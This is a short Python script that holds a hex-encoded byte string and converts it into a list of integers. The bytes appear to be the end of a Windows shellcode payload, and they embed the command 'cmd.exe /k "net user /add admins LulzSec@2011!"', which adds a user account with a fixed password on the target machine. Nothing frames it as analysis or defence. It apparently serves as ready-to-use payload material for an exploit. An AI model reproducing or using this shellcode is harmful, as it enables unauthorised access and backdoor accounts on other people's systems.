#!/usr/bin/python

hex_string = "0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x6b,0x20,0x22,0x6e,0x65,0x74,0x20,0x75,0x73,0x65,0x72,0x20,0x2f,0x61,0x64,0x64,0x20,0x61,0x64,0x6d,0x69,0x6e,0x73,0x20,0x4c,0x75,0x6c,0x7a,0x53,0x65,0x63,0x40,0x32,0x30,0x31,0x31,0x21,0x00"

integer_list = [int(value, 16) for value in hex_string.split(",")]
